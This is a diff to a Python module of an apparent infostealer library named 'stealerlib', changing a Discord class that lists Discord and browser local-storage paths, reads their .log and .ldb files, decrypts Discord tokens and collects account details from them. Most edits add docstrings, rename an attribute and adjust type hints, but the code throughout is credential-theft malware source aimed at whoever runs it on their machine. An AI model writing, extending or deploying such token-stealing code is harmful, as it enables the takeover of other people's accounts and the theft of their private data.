@@ -18,6 +18,17 @@ from stealerlib.apps.discord.types import DiscordTypes
 
 
 class Discord:
+    """This class provides methods for extracting and decrypting information from the local Discord and browser databases
+
+    Attributes:
+        tokens      A list of plaintext Discord tokens gathered from all available paths (self.available)
+        accounts    A list of account information collected from each Discord token stored in a list of values or a StealerLib object
+        roaming     The path to the local roaming folder
+        appdata     The path to the local appdata folder
+        paths       A dictionary of file paths where Discord tokens are stored
+        available   A list of file paths that exist on the local machine (derived from self.paths)
+    """
+
     def __init__(self):
         self.tokens = []
         self.accounts = []
@@ -52,7 +63,7 @@ class Discord:
             'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
             'Iridium': appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
         }
-        self.available_paths = self.get_available_paths()
+        self.available = self.get_available_paths()
 
     def get_available_paths(self) -> list:
         """Iterated through each available Discord-related path where tokens could be found and checks if it exists
@@ -61,7 +72,7 @@ class Discord:
             self (object): The object passed to the method
 
         Returns:
-            list: A list of available paths.
+            list: A list of the gathered paths that exist on the local machine
         """
 
         available_paths = []
@@ -73,7 +84,10 @@ class Discord:
         return available_paths
 
     @catch
-    def get_tokens(self, conv: bool=True) ->  list[Union[str, DiscordTypes.Account]]:
+    def get_tokens(
+        self,
+        conv: Optional[bool]=True
+    ) -> list[Union[str, DiscordTypes.Token]]:
         """Iterates through each of the available paths and decrypt the Discord tokens stored in them
 
         Parameters:
@@ -84,7 +98,7 @@ class Discord:
             list: A list of scraped Discord tokens from the machine
         """
 
-        for path in self.available_paths:
+        for path in self.available:
             for file in os.listdir(path):
                 if not file.endswith(".log") and not file.endswith(".ldb"):
                     continue
@@ -103,11 +117,11 @@ class Discord:
     @catch
     def get_token_information(
         self,
-        tokens: Union[list[list], list[DiscordTypes.Token]],
-        conv: Optional[str]=True
+        tokens: list[Union[str, DiscordTypes.Token]],
+        conv: Optional[bool]=True
     ) -> list[Union[list, DiscordTypes.Account]]:
-        """Iterates through each token passed and calls the get_information function -
-           based on whether it's a StealerLib object or not
+        """Iterates through each token and calls the get_information function -
+           on the either supplied or newly-created StealerLib object
 
         Parameters:
             self (object): The object passed to the method
